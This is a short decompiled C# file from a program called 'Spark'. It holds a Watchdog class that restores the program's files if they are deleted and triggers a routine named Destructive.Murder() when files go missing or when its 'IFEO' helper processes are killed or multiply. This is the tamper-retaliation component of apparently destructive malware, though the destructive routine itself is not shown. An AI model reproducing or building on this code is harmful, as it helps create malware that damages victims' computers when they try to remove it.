using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Spark
{
	// Token: 0x0200000E RID: 14
	internal class Watchdog
	{
		// Token: 0x06000040 RID: 64 RVA: 0x00002FD4 File Offset: 0x000011D4
		public static void CheckFiles(string[] sFileName, bool bMurder)
		{
			for (int i = 0; i < sFileName.Length; i++)
			{
				if (!File.Exists(sFileName[i]))
				{
					Files.UnpackFiles();
					if (bMurder)
					{
						Destructive.Murder();
					}
				}
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00003008 File Offset: 0x00001208
		public static void CheckIFEO()
		{
			for (;;)
			{
				Thread.Sleep(500);
				int num = Process.GetProcessesByName("IFEO").Length;
				if (num <= Variables.IFEOLastCheck - 1)
				{
					Destructive.Murder();
				}
				if (num >= 3)
				{
					Destructive.Murder();
				}
			}
		}
	}
}
